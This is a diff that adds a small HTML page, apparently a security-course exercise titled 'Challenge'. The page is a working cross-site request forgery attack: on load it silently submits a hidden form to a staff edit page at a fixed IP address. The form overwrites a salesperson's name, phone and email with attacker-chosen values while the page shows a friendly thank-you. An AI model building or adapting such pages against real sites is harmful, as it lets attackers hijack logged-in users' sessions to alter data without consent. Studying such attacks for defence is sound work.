@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Challenge</title>
+  </head>
+  <body onload="runMe()">
+    <h1>Thank you for updating this for me</h1>
+
+    <form
+      name="hacked"
+      action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5"
+      method="POST"
+      style="display: none"
+    >
+      <input type="text" name="first_name" value="ThisIsNotKenAnymore" />
+      <input type="text" name="last_name" value="LastNameDoesNotExist" />
+      <input type="text" name="phone" value="666-666-666" />
+      <input type="text" name="email" value="thisisnot@valid.com" />
+
+      <input type="submit" />
+    </form>
+    <script>
+      function runMe() {
+        document.hacked.submit();
+      }
+    </script>
+  </body>
+</html>
